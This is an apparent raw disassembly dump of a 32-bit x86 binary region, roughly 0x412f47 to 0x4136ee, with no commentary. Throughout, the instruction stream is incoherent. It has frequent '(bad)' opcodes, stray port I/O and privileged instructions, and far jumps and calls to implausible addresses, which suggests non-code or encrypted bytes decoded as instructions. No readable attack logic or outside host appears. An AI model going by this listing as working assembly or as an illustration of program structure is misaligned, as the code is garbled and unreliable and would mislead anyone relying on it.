  412f47:	add    eax,0x979a3ff5
  412f4c:	les    edx,FWORD PTR [ebx]
  412f4e:	xor    DWORD PTR [edx+ecx*1],ebx
  412f51:	mov    ah,bl
  412f53:	int    0x3d
  412f55:	add    DWORD PTR [ecx-0x7d6b93f3],0xe5174c3
  412f5f:	cmp    ah,dh
  412f61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f62:	pop    ds
  412f63:	or     ch,bl
  412f65:	push   esp
  412f66:	jge    0x412fc4
  412f68:	cli    
  412f69:	or     al,0x55
  412f6b:	pusha  
  412f6c:	mov    dl,0x97
  412f6e:	lock mov eax,ds:0x93d144aa
  412f74:	mov    esp,0xf72b7ef2
  412f79:	mov    edx,0x4344dcdc
  412f7e:	inc    edi
  412f7f:	daa    
  412f80:	fnsave [edx+esi*2]
  412f83:	in     al,0xfb
  412f85:	xor    DWORD PTR [edx+0x5743e7b1],0x2d001a2c
  412f8f:	imul   edi,edx,0x6353f6cb
  412f95:	pop    es
  412f96:	out    dx,al
  412f97:	call   0x238f048e
  412f9c:	or     ch,BYTE PTR [edi]
  412f9e:	xlat   BYTE PTR ds:[ebx]
  412f9f:	call   0xf91e:0xe24d6973
  412fa6:	cli    
  412fa7:	imul   edx,DWORD PTR [ebp+edx*8+0x4f],0x86d3a356
  412faf:	popa   
  412fb0:	dec    esp
  412fb1:	or     dh,cl
  412fb3:	pop    edi
  412fb4:	jns    0x412f6d
  412fb6:	les    ecx,FWORD PTR [ebx]
  412fb8:	fcom   DWORD PTR [ebp+0x67035b9c]
  412fbe:	aaa    
  412fbf:	dec    ecx
  412fc0:	xchg   DWORD PTR [ebp+0x5a16bdbe],esp
  412fc6:	and    ebp,esp
  412fc8:	in     eax,0x94
  412fca:	cli    
  412fcb:	test   al,0x5e
  412fcd:	pop    ecx
  412fce:	inc    ecx
  412fcf:	loop   0x413000
  412fd1:	jmp    0x412fa4
  412fd3:	aas    
  412fd4:	(bad)  
  412fd5:	out    dx,eax
  412fd6:	push   ebp
  412fd7:	adc    BYTE PTR [ecx],dl
  412fd9:	out    dx,eax
  412fda:	hlt    
  412fdb:	fwait
  412fdc:	mov    cl,cl
  412fde:	jae    0x413048
  412fe0:	mov    al,0x84
  412fe2:	retf   0xb63d
  412fe5:	push   eax
  412fe6:	or     ebx,DWORD PTR [esp+eiz*2]
  412fe9:	adc    ecx,DWORD PTR [esi+ebp*8-0x2ec17b1c]
  412ff0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ff1:	out    dx,al
  412ff2:	in     eax,dx
  412ff3:	pop    edx
  412ff4:	jne    0x412fed
  412ff6:	imul   edx,DWORD PTR [ebp+0x6],0x5034f5f2
  412ffd:	cmp    bl,cl
  412fff:	or     al,0xaf
  413001:	cmp    eax,edi
  413003:	not    ecx
  413005:	dec    ebx
  413006:	test   eax,0x7a72e242
  41300b:	and    eax,0x4378d5ea
  413010:	jnp    0x413016
  413012:	pushf  
  413013:	test   DWORD PTR [esi+0x6fe7e043],ecx
  413019:	push   ds
  41301a:	adc    al,0x42
  41301c:	je     0x412fad
  41301e:	dec    esp
  41301f:	pop    es
  413020:	(bad)  
  413021:	mov    ch,0x7a
  413023:	xchg   ebp,eax
  413024:	or     al,BYTE PTR [ebx+0x5e]
  413027:	dec    esp
  413028:	aad    0xc5
  41302a:	sbb    BYTE PTR [ecx],ch
  41302c:	xor    eax,0xdf51800
  413031:	mov    esp,0x15e3475e
  413036:	xchg   esp,eax
  413037:	add    eax,0xe54283
  41303c:	jns    0x41304f
  41303e:	(bad)  
  41303f:	mul    DWORD PTR [ecx]
  413041:	test   eax,0xc984bea0
  413046:	in     eax,dx
  413047:	popf   
  413048:	out    0x70,al
  41304a:	call   0xd306cc05
  41304f:	imul   esp,DWORD PTR [ebx],0x97d7e376
  413055:	cmc    
  413056:	adc    al,0x99
  413058:	int    0x9d
  41305a:	jl     0x413035
  41305c:	mov    ch,0x4b
  41305e:	dec    ebp
  41305f:	or     eax,0xc7f4a17f
  413064:	ret    
  413065:	lahf   
  413066:	(bad)  
  413067:	push   cs
  413068:	js     0x413078
  41306a:	or     esp,esi
  41306c:	rcr    edx,0xbe
  41306f:	inc    ecx
  413071:	arpl   si,cx
  413073:	mov    ds:0x6d32a0a2,eax
  413078:	sar    BYTE PTR ds:0x1d463db3,1
  41307e:	mov    edx,0xe3c33d8
  413083:	call   0x49e7c035
  413088:	ins    DWORD PTR es:[edi],dx
  413089:	xchg   ecx,eax
  41308a:	cwde   
  41308b:	xor    dl,BYTE PTR ds:0x472014fd
  413091:	ja     0x4130ea
  413093:	pop    edi
  413094:	int    0x9d
  413096:	sbb    al,0x14
  413098:	std    
  413099:	loope  0x41305f
  41309b:	rol    BYTE PTR [ebp+edi*4+0x2ee5bf58],1
  4130a2:	inc    edi
  4130a3:	mov    dh,0x59
  4130a5:	ror    BYTE PTR ds:0x3178cfcd,0x3e
  4130ac:	psubusw mm2,QWORD PTR [ecx+edi*1]
  4130b0:	mov    eax,ds:0xe424de7f
  4130b5:	mov    esi,ss
  4130b7:	loope  0x41306c
  4130b9:	fistp  QWORD PTR ds:0x8dae939b
  4130bf:	stos   DWORD PTR es:[edi],eax
  4130c0:	push   eax
  4130c1:	dec    ebx
  4130c2:	sbb    DWORD PTR [ebp+esi*2+0x10318180],edi
  4130c9:	shr    DWORD PTR ds:0xbd29d865,1
  4130cf:	rcr    DWORD PTR [esi-0x26],1
  4130d2:	int    0xa4
  4130d4:	dec    edx
  4130d5:	jg     0x4130ab
  4130d7:	xor    eax,0xd50e7101
  4130dc:	into   
  4130dd:	cmp    ch,BYTE PTR [ebx-0x4a]
  4130e0:	or     edx,edi
  4130e2:	sub    BYTE PTR [ebx+0x29],0xe4
  4130e6:	not    edi
  4130e8:	inc    BYTE PTR [ebp+ebp*4+0x53]
  4130ec:	out    dx,al
  4130ed:	sub    al,bl
  4130ef:	fstp   TBYTE PTR [edi]
  4130f1:	cdq    
  4130f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130f3:	shr    edx,1
  4130f5:	xor    edx,edi
  4130f7:	ret    0xc794
  4130fa:	pop    es
  4130fb:	imul   eax,DWORD PTR [ebp-0xcf2106a],0x41
  413102:	push   ecx
  413103:	dec    ebp
  413104:	rcl    DWORD PTR [eax-0x7e],cl
  413107:	je     0x4130dd
  413109:	daa    
  41310a:	xlat   BYTE PTR ds:[ebx]
  41310b:	jmp    0x4e21477a
  413110:	sub    esp,DWORD PTR [esi-0x6b]
  413113:	inc    ebx
  413114:	mov    ah,0x95
  413116:	int3   
  413117:	in     al,0xf7
  413119:	scas   eax,DWORD PTR es:[edi]
  41311a:	lods   al,BYTE PTR ds:[esi]
  41311b:	and    al,0xde
  41311d:	test   bl,cl
  41311f:	adc    BYTE PTR [edx+eax*4+0x6d],dh
  413123:	jg     0x4130e1
  413125:	mov    dl,0xb5
  413127:	push   eax
  413128:	mov    bl,0x50
  41312a:	sti    
  41312b:	in     al,0x9d
  41312d:	dec    ebx
  41312e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41312f:	(bad)  
  413130:	xlat   BYTE PTR ds:[ebx]
  413131:	in     al,0x2f
  413133:	and    eax,0xeec6889
  413138:	mov    esp,0x1aec26d1
  41313d:	dec    esp
  41313e:	scas   al,BYTE PTR es:[edi]
  41313f:	inc    ecx
  413140:	fdivr  DWORD PTR [ebx+0x7c715f98]
  413146:	imul   ecx,edx,0x362ae7c4
  41314c:	push   ecx
  41314d:	imul   edx,ebx,0xa5ab0072
  413153:	add    bh,dl
  413155:	stos   DWORD PTR es:[edi],eax
  413156:	xor    eax,0x6923ee0e
  41315b:	and    eax,0x38c7fe2b
  413160:	mov    WORD PTR [eax],ds
  413162:	mov    eax,0x3aaa2a3e
  413167:	cmp    al,0x33
  413169:	xchg   DWORD PTR [edi+0x7ff954a0],ecx
  41316f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413170:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413171:	mov    bh,0x50
  413173:	push   es
  413174:	stos   BYTE PTR es:[edi],al
  413175:	int    0x12
  413177:	mov    dh,0xd8
  413179:	cmp    esi,DWORD PTR [esi]
  41317b:	adc    esp,DWORD PTR [esi+0x3d]
  41317e:	add    al,0xbc
  413180:	sar    BYTE PTR [ecx-0x4818a58e],0xac
  413187:	xor    esp,edi
  413189:	rcl    DWORD PTR [eax+0x70],cl
  41318c:	xchg   ebp,eax
  41318d:	sti    
  41318e:	ss jmp 0x20b76f1c
  413194:	sbb    al,0xf6
  413196:	icebp  
  413197:	push   ebx
  413198:	jno    0x41314a
  41319a:	mov    al,0x3
  41319c:	outs   dx,DWORD PTR ds:[esi]
  41319d:	fs sub ebx,ebp
  4131a0:	retf   
  4131a1:	jge    0x4131c8
  4131a3:	dec    ecx
  4131a4:	fldenv [eax+eiz*2]
  4131a7:	fnstcw WORD PTR [edx]
  4131a9:	ja     0x413146
  4131ab:	inc    esi
  4131ac:	mov    ah,0x52
  4131ae:	cwde   
  4131af:	gs cmp edi,eax
  4131b2:	xchg   esi,eax
  4131b3:	xchg   ebp,eax
  4131b4:	xor    ah,BYTE PTR [edi-0x63db4a41]
  4131ba:	test   al,0xaa
  4131bc:	and    dh,dh
  4131be:	push   0xa470d01b
  4131c3:	jp     0x413174
  4131c5:	cmp    eax,0xebb99c38
  4131ca:	sub    al,0xe6
  4131cc:	mov    ds:0x960252a4,al
  4131d1:	pop    ds
  4131d2:	sbb    DWORD PTR [eax+0x57],edx
  4131d5:	out    dx,eax
  4131d6:	push   eax
  4131d7:	(bad)  
  4131d8:	fistp  DWORD PTR [eax-0x3fcf15e]
  4131de:	clc    
  4131df:	iret   
  4131e0:	nop
  4131e1:	mov    esp,0x5873fead
  4131e6:	pop    ebp
  4131e7:	int    0x86
  4131e9:	sub    BYTE PTR [edx],0x2c
  4131ec:	jge    0x4131aa
  4131ee:	je     0x41319b
  4131f0:	repz inc edi
  4131f2:	jle    0x4131b2
  4131f4:	pop    ss
  4131f5:	xchg   ebx,eax
  4131f6:	popf   
  4131f7:	jmp    0x4131e9
  4131f9:	bound  esp,QWORD PTR [esi+0x70]
  4131fc:	mov    edi,0x6f6bcd15
  413201:	scas   al,BYTE PTR es:[edi]
  413202:	fdivr  st(7),st
  413204:	fistp  QWORD PTR [esp+ebp*2-0x145e6a4d]
  41320b:	xor    eax,0xbca97056
  413210:	sbb    al,0x57
  413212:	push   ss
  413213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413214:	mov    edi,0xa5f1047a
  413219:	popa   
  41321a:	inc    edx
  41321b:	xchg   ebp,eax
  41321c:	nop
  41321d:	leave  
  41321e:	inc    eax
  41321f:	mov    WORD PTR [edx-0x17f1854e],?
  413225:	in     eax,0x27
  413227:	sbb    eax,0xffffffd6
  41322a:	out    dx,eax
  41322b:	pop    ecx
  41322c:	pushf  
  41322d:	stos   BYTE PTR es:[edi],al
  41322e:	and    eax,0x8e8839cd
  413233:	dec    edx
  413234:	icebp  
  413235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413236:	sub    esp,DWORD PTR [edx-0x2ba8f6e4]
  41323c:	fucomip st,st(3)
  41323e:	pop    ecx
  41323f:	mov    dh,0xfc
  413241:	jp     0x4131f7
  413243:	xchg   DWORD PTR [ecx+0x5e],esi
  413246:	pop    esi
  413247:	test   DWORD PTR [eax-0x46c3c062],edx
  41324d:	and    eax,0x6942ede8
  413252:	xchg   esi,eax
  413253:	push   ss
  413254:	pop    eax
  413255:	outs   dx,BYTE PTR ds:[esi]
  413256:	adc    edx,0x16e02468
  41325c:	xchg   ebx,eax
  41325d:	sbb    DWORD PTR [esi+0x9],eax
  413260:	out    0xde,eax
  413262:	xchg   ebp,eax
  413263:	xchg   edi,eax
  413264:	xchg   BYTE PTR [ebp+0x26],ah
  413267:	adc    ebp,eax
  413269:	push   edi
  41326a:	retf   0xb604
  41326d:	mul    BYTE PTR [ecx]
  41326f:	sub    eax,0x84df423f
  413274:	out    dx,eax
  413275:	mov    al,0xf2
  413277:	fld    TBYTE PTR [esi]
  413279:	fadd   DWORD PTR [edi+ecx*1]
  41327c:	push   eax
  41327d:	cmp    dh,BYTE PTR [esi]
  41327f:	in     eax,0xf4
  413281:	mov    ecx,0xafc7bc7e
  413286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413287:	out    dx,eax
  413288:	dec    ebp
  413289:	aam    0x4d
  41328b:	loop   0x4132e6
  41328d:	pop    ds
  41328e:	xor    BYTE PTR [edi],ch
  413290:	les    ebx,FWORD PTR [ecx-0x3f]
  413293:	inc    ecx
  413294:	xor    DWORD PTR [edi+ecx*4+0x47bcc54a],ebp
  41329b:	ds (bad) 
  41329e:	test   eax,0xef49e382
  4132a3:	xor    BYTE PTR [ebp+0x79b32a8],0x82
  4132aa:	and    DWORD PTR [edi],ecx
  4132ac:	rcr    BYTE PTR [esp+eax*8],1
  4132af:	adc    eax,0x91fcaa6f
  4132b4:	ds out 0xbf,eax
  4132b7:	pop    ebx
  4132b8:	test   eax,0x2f68f061
  4132bd:	push   edx
  4132be:	pusha  
  4132bf:	js     0x413261
  4132c1:	arpl   WORD PTR [ebx-0x20b4b59b],dx
  4132c7:	shr    edx,cl
  4132c9:	sub    DWORD PTR [eax-0x34],ebp
  4132cc:	mov    cl,0x8e
  4132ce:	fs jmp 0x604f:0x2404e5c8
  4132d6:	jo     0x4132fc
  4132d8:	leave  
  4132d9:	test   eax,0x8d184806
  4132de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132df:	and    eax,0xd5d597e4
  4132e4:	pop    esi
  4132e5:	loop   0x4132ec
  4132e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132e8:	add    cl,dl
  4132ea:	adc    ah,BYTE PTR [ecx+0x25]
  4132ed:	xor    BYTE PTR [ebp+0x36],bh
  4132f0:	outs   dx,BYTE PTR ds:[esi]
  4132f1:	stc    
  4132f2:	mov    DWORD PTR [ecx],edx
  4132f4:	in     al,dx
  4132f5:	cmp    eax,0xee749b6d
  4132fa:	aad    0x52
  4132fc:	dec    edx
  4132fd:	sbb    al,0x1e
  4132ff:	or     al,0xb6
  413301:	dec    ecx
  413302:	aam    0x4c
  413304:	(bad)  
  413305:	cld    
  413306:	lock cmp al,0x7c
  413309:	pop    DWORD PTR [ebp-0x4fcdb8bc]
  41330f:	stc    
  413310:	scas   al,BYTE PTR es:[edi]
  413311:	sbb    BYTE PTR [ecx+ebx*4],dh
  413314:	enter  0xc9c9,0x54
  413318:	adc    BYTE PTR [edx-0x25d1c150],dl
  41331e:	(bad)  
  41331f:	dec    eax
  413320:	xor    BYTE PTR [ecx+0x6b],ch
  413323:	jne    0x41337e
  413325:	sub    eax,0xf14e6200
  41332a:	rol    BYTE PTR [edx-0x727b69cd],1
  413330:	push   ss
  413331:	lds    edx,FWORD PTR [edi]
  413333:	adc    eax,0xfdec96bc
  413338:	mov    ecx,0x5a1d2c7a
  41333d:	add    edx,DWORD PTR [ecx]
  41333f:	xchg   ebp,eax
  413340:	out    dx,eax
  413341:	inc    esi
  413342:	and    dh,BYTE PTR [esi-0x70250e8a]
  413348:	out    0x96,al
  41334a:	cdq    
  41334b:	lds    eax,FWORD PTR [ebx]
  41334d:	adc    bh,bh
  41334f:	mov    al,ds:0xec5b1b36
  413354:	shl    BYTE PTR [ebx-0x2019c5aa],cl
  41335a:	push   DWORD PTR [eax-0x80]
  41335d:	pop    esi
  41335e:	adc    DWORD PTR [eax-0x30070dcd],ebx
  413364:	out    0x68,al
  413366:	lds    ebx,FWORD PTR [ecx+0x20d3b293]
  41336c:	mov    edx,0xdd584492
  413371:	pushf  
  413372:	add    ebx,DWORD PTR [esi]
  413374:	in     al,0x86
  413376:	in     eax,0xdc
  413378:	imul   ecx,ebx,0xd663967f
  41337e:	ss jmp 0x4133e8
  413381:	mov    ebp,0xd5453b33
  413386:	cmc    
  413387:	mov    ch,0xdd
  413389:	pop    ds
  41338a:	mov    cl,0xe9
  41338c:	enter  0xd3a7,0xfb
  413390:	sbb    BYTE PTR [edx],dh
  413392:	mov    al,ds:0x45892b1a
  413397:	ins    BYTE PTR es:[edi],dx
  413398:	jg     0x4133e3
  41339a:	data16 in al,0xd0
  41339d:	sub    al,0x12
  41339f:	dec    edi
  4133a0:	pop    es
  4133a1:	push   edx
  4133a2:	icebp  
  4133a3:	in     al,dx
  4133a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133a5:	cmp    cl,0xfe
  4133a8:	lods   eax,DWORD PTR ds:[esi]
  4133a9:	test   eax,0xefdb68
  4133ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133af:	push   ds
  4133b0:	ins    BYTE PTR es:[edi],dx
  4133b1:	aad    0x29
  4133b3:	retf   
  4133b4:	or     al,0xca
  4133b6:	push   eax
  4133b7:	jmp    0x413345
  4133b9:	aad    0x6a
  4133bb:	add    al,0x86
  4133bd:	sar    BYTE PTR [esi+0x42],0xf2
  4133c1:	sbb    cl,al
  4133c3:	inc    eax
  4133c4:	test   BYTE PTR [edi+ecx*4-0x479f82d6],0x43
  4133cc:	call   0xe680:0xa7e33b2
  4133d3:	outs   dx,DWORD PTR ds:[esi]
  4133d4:	loopne 0x4133ea
  4133d6:	dec    eax
  4133d7:	and    dl,BYTE PTR [esi+esi*4-0x1c2080f7]
  4133de:	idiv   edi
  4133e0:	jae    0x4133d0
  4133e2:	jns    0x4133bd
  4133e4:	mov    dl,0x71
  4133e6:	inc    esi
  4133e7:	aas    
  4133e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133e9:	cmp    al,BYTE PTR [edx+0x6b696e03]
  4133ef:	push   edi
  4133f0:	jns    0x413466
  4133f2:	mov    al,0xc1
  4133f4:	dec    esi
  4133f5:	out    0xd1,eax
  4133f7:	(bad)  
  4133f8:	in     eax,dx
  4133f9:	push   ds
  4133fa:	sbb    esi,edi
  4133fc:	push   edi
  4133fd:	or     eax,0x5fa5a269
  413402:	aas    
  413403:	add    bl,BYTE PTR [ebp+0x79b053bf]
  413409:	lods   eax,DWORD PTR ds:[esi]
  41340a:	pushf  
  41340b:	inc    esi
  41340c:	add    edi,DWORD PTR [ebp-0x35]
  41340f:	test   al,0xf8
  413411:	mov    dl,0x73
  413413:	xchg   ecx,eax
  413414:	clc    
  413415:	pusha  
  413416:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413417:	push   es
  413418:	ror    DWORD PTR [esi+0x21ae9864],0xae
  41341f:	cmp    cl,BYTE PTR ds:0x290892f5
  413425:	in     eax,0xee
  413427:	xchg   ebp,eax
  413428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413429:	jne    0x4133f1
  41342b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41342c:	retf   
  41342d:	xchg   ecx,eax
  41342e:	mov    ebp,0xe9fb0ed4
  413433:	shl    BYTE PTR [edx+0x39],1
  413436:	push   eax
  413437:	lods   eax,DWORD PTR ds:[esi]
  413438:	jmp    0x9a11:0xc71c4e93
  41343f:	mov    edi,esi
  413441:	sbb    al,0x33
  413443:	int3   
  413444:	ret    
  413445:	mov    ecx,0x2c6677d7
  41344a:	inc    edx
  41344b:	test   al,0xda
  41344d:	enter  0xd9bf,0x58
  413451:	cmp    DWORD PTR [ecx-0x36],ebx
  413454:	and    eax,DWORD PTR [ecx-0x12707cca]
  41345a:	stos   BYTE PTR es:[edi],al
  41345b:	aaa    
  41345c:	enter  0xd5cf,0xa6
  413460:	pop    ds
  413461:	out    0xca,eax
  413463:	jae    0x4134d5
  413465:	jns    0x4134a5
  413467:	push   ss
  413468:	call   0x12d03635
  41346d:	or     al,bh
  41346f:	(bad)  
  413471:	lahf   
  413472:	aaa    
  413473:	ins    BYTE PTR es:[edi],dx
  413474:	cld    
  413475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413476:	adc    BYTE PTR [ecx+0x66f63659],ch
  41347c:	les    ecx,FWORD PTR ds:0xac9f9700
  413482:	mov    cl,0x32
  413484:	adc    DWORD PTR ds:[ecx-0x6f],0x1c
  413489:	push   ecx
  41348a:	mov    bl,0xda
  41348c:	fiadd  WORD PTR [esi-0x2fef1a79]
  413492:	test   DWORD PTR [edi+0x3e],edi
  413495:	cmp    esp,ebp
  413497:	jno    0x4134bb
  413499:	mov    al,0x34
  41349b:	jno    0x4134ac
  41349d:	nop
  41349e:	adc    ebx,DWORD PTR [edx+0x55]
  4134a1:	cli    
  4134a2:	adc    edi,edx
  4134a4:	(bad)  
  4134a6:	push   0xffffffb4
  4134a8:	adc    DWORD PTR [eax-0x27ac29de],edi
  4134ae:	in     al,dx
  4134af:	fsub   st(1),st
  4134b1:	ffreep st(2)
  4134b3:	loop   0x4134c5
  4134b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134b6:	jmp    0xabd69717
  4134bb:	ins    DWORD PTR es:[edi],dx
  4134bc:	out    dx,al
  4134bd:	fcom   st(1)
  4134bf:	std    
  4134c0:	nop
  4134c1:	cmp    BYTE PTR [edi],ch
  4134c3:	fstp   st(6)
  4134c5:	ret    
  4134c6:	fmul   st(2),st
  4134c8:	cwde   
  4134c9:	jecxz  0x4134e3
  4134cb:	jl     0x413490
  4134cd:	sbb    ah,al
  4134cf:	sub    al,0x3e
  4134d1:	mov    al,0x9a
  4134d3:	call   0x1245c059
  4134d8:	sti    
  4134d9:	mov    ch,0x3c
  4134db:	test   al,0x6e
  4134dd:	fs enter 0xb1f9,0xcb
  4134e2:	stos   BYTE PTR es:[edi],al
  4134e3:	clc    
  4134e4:	cmp    al,0x1f
  4134e6:	jmp    0x7480:0x913070f2
  4134ed:	mov    ds:0x8063c175,al
  4134f2:	arpl   WORD PTR [ebp-0x2],si
  4134f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134f6:	mov    eax,0xedefed72
  4134fb:	mov    ecx,0xfd83cf36
  413500:	shl    WORD PTR [edi],0x8f
  413504:	outs   dx,DWORD PTR ds:[esi]
  413505:	jo     0x41352c
  413507:	rcl    DWORD PTR [edi+0x16],0x68
  41350b:	out    0x5f,eax
  41350d:	mov    edx,0x4310fa7b
  413512:	add    eax,0x9409e712
  413517:	push   ebx
  413518:	dec    esp
  413519:	push   DWORD PTR [edx+0x6277b926]
  41351f:	pop    esi
  413520:	mov    eax,0xa84bf085
  413525:	jae    0x413560
  413527:	push   esp
  413528:	xchg   DWORD PTR [ebp+0x29],ebp
  41352b:	test   eax,0xad603de5
  413530:	loope  0x41358a
  413532:	arpl   WORD PTR [ebx+0x1e8a2f46],sp
  413538:	fmul   st,st(3)
  41353a:	jg     0x41350b
  41353c:	sub    edi,esp
  41353e:	and    BYTE PTR [edi-0x6e],ch
  413541:	cmp    esi,esp
  413543:	xchg   esi,eax
  413544:	shr    ch,cl
  413546:	xchg   esi,eax
  413547:	cmp    eax,0xe978458b
  41354c:	sub    eax,0x5a26fdf6
  413551:	test   BYTE PTR [ebx+0x66],ah
  413554:	rcr    DWORD PTR [ebx+eiz*1+0x9],0xbc
  413559:	lods   al,BYTE PTR ds:[esi]
  41355a:	loope  0x413521
  41355c:	xlat   BYTE PTR ds:[ebx]
  41355d:	je     0x41354f
  41355f:	imul   ebp,DWORD PTR [ebp+edx*2-0x76],0x4e96997f
  413567:	sbb    DWORD PTR [edi],0xabeea88f
  41356d:	std    
  41356e:	inc    edx
  41356f:	dec    edx
  413570:	pushf  
  413571:	xor    al,0xf5
  413573:	add    DWORD PTR [esi+0x543a8500],eax
  413579:	push   es
  41357a:	mov    ah,0xfa
  41357c:	jae    0x4135e0
  41357e:	int    0xe4
  413580:	das    
  413581:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413582:	mov    ah,0xa9
  413584:	sub    cl,BYTE PTR [esi-0x67]
  413587:	push   ecx
  413588:	sub    dh,BYTE PTR [ebx-0x6d]
  41358b:	and    DWORD PTR [edx+edx*8],edi
  41358e:	xor    DWORD PTR [eax],ebx
  413590:	int    0xac
  413592:	cmp    dh,BYTE PTR [edx+eiz*1-0x28]
  413596:	xor    dl,BYTE PTR [ebp+0x7c1efa4c]
  41359c:	ds ds dec ebp
  41359f:	shr    BYTE PTR ds:0xaf25e159,0xc4
  4135a6:	ins    DWORD PTR es:[edi],dx
  4135a7:	mov    al,ds:0xcc99198e
  4135ac:	fdivrp st(7),st
  4135ae:	jno    0x41358c
  4135b0:	xor    bh,dl
  4135b2:	jno    0x413621
  4135b4:	mov    eax,0xacca073d
  4135b9:	sbb    esp,esi
  4135bb:	xchg   BYTE PTR [ebp+0x6c],dh
  4135be:	scas   eax,DWORD PTR es:[edi]
  4135bf:	sub    eax,0x5a0f165d
  4135c4:	sti    
  4135c5:	push   ebx
  4135c6:	fdiv   DWORD PTR [edi+0x72]
  4135c9:	adc    esi,DWORD PTR [edi]
  4135cb:	mov    esi,ebp
  4135cd:	test   ecx,esp
  4135cf:	fld    TBYTE PTR ds:0x2f7f34b8
  4135d5:	mov    bl,0xd3
  4135d7:	je     0x41363d
  4135d9:	jnp    0x413630
  4135db:	xchg   edi,eax
  4135dc:	xlat   BYTE PTR ds:[ebx]
  4135dd:	add    eax,0x30488e85
  4135e2:	add    edx,edx
  4135e4:	repz cmp eax,DWORD PTR [esi]
  4135e7:	push   ebx
  4135e8:	rol    DWORD PTR [eax-0x54367d8],1
  4135ee:	dec    ecx
  4135ef:	inc    ecx
  4135f0:	inc    esi
  4135f1:	fisttp QWORD PTR [ecx]
  4135f3:	test   al,0x7c
  4135f5:	mov    al,0x1
  4135f7:	shl    DWORD PTR [edi-0x4b],1
  4135fa:	sub    esp,DWORD PTR [esi]
  4135fc:	imul   ebp,DWORD PTR [esi],0xffffffee
  4135ff:	xchg   ebx,eax
  413600:	mov    ebx,0xf2f6199
  413605:	add    al,0x8f
  413607:	sbb    BYTE PTR [ecx],0x31
  41360a:	mov    bl,0x4f
  41360c:	mov    dh,0x14
  41360e:	push   ebp
  41360f:	mov    ch,0x6a
  413611:	mov    ss,WORD PTR [esi+edx*4]
  413614:	les    ecx,FWORD PTR [edx-0x19]
  413617:	and    ah,BYTE PTR [eax*1-0x214401d9]
  41361e:	push   cs
  41361f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413620:	repnz mov edx,0x8d83b714
  413626:	mov    bl,0xaf
  413628:	and    eax,0x1ddc88b2
  41362d:	dec    edx
  41362e:	cwde   
  41362f:	xchg   ebp,eax
  413630:	sahf   
  413631:	cmp    dl,BYTE PTR [edx]
  413633:	mov    ch,0xd8
  413635:	enter  0xf998,0x54
  413639:	or     eax,0x76d715be
  41363e:	xor    DWORD PTR [eax+0x5b7f2c6d],edi
  413644:	lahf   
  413645:	cmp    eax,0xf04edb0
  41364a:	das    
  41364b:	inc    esp
  41364c:	pop    eax
  41364d:	data16 jl 0x41361e
  413650:	xchg   edi,eax
  413651:	dec    edi
  413652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413653:	mov    ch,0xf7
  413655:	push   edx
  413656:	xlat   BYTE PTR ds:[ebx]
  413657:	(bad)  
  413658:	(bad)  
  413659:	(bad)  
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	loop   0x41361c
  41365d:	int3   
  41365e:	fsubr  QWORD PTR ds:0xb3b0f328
  413664:	mov    dl,cl
  413666:	rcl    BYTE PTR [edx-0x5617b4a7],cl
  41366c:	stos   BYTE PTR es:[edi],al
  41366d:	sub    eax,0x57de2801
  413672:	and    DWORD PTR [esi+0x15],edi
  413675:	ds fwait
  413677:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413678:	into   
  413679:	das    
  41367a:	inc    esp
  41367b:	adc    eax,0xf2016c22
  413680:	mov    al,0x3e
  413682:	and    esp,edx
  413684:	mov    ebp,0x1234e6bc
  413689:	push   edx
  41368a:	mov    ebp,0x7df9acf5
  41368f:	pop    edx
  413690:	xchg   edi,eax
  413691:	mov    ecx,0x84b23e77
  413696:	xchg   ebp,eax
  413697:	sbb    edi,eax
  413699:	or     DWORD PTR [eax+0xb0dca81],0x3366e4ac
  4136a3:	sub    BYTE PTR [eax+0x1b70bd6b],bh
  4136a9:	xchg   ecx,eax
  4136aa:	retf   0x70db
  4136ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136ae:	inc    ebp
  4136af:	and    eax,DWORD PTR [eax+ebx*2]
  4136b2:	jne    0x41364f
  4136b4:	push   0x30
  4136b6:	mov    dl,0x64
  4136b8:	loopne 0x413655
  4136ba:	int3   
  4136bb:	bnd jo 0x41367b
  4136be:	jmp    0xac2d:0xf496c570
  4136c5:	xor    al,0xc
  4136c7:	pop    ebx
  4136c8:	push   ds
  4136c9:	adc    ecx,DWORD PTR [edx+0x6d]
  4136cc:	pop    ecx
  4136cd:	mov    al,ds:0x88774bf8
  4136d2:	out    0xf4,eax
  4136d4:	add    al,0x59
  4136d6:	bound  esi,QWORD PTR [ebx+ecx*2]
  4136d9:	sbb    al,0xc2
  4136db:	adc    al,0xac
  4136dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136de:	xchg   edi,eax
  4136df:	cmp    eax,0x718edd37
  4136e4:	lods   eax,DWORD PTR ds:[esi]
  4136e5:	daa    
  4136e6:	pop    ecx
  4136e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136e8:	and    DWORD PTR [ebx-0x3c],esp
  4136eb:	stos   BYTE PTR es:[edi],al
  4136ec:	out    0x48,eax
  4136ee:	(bad)  
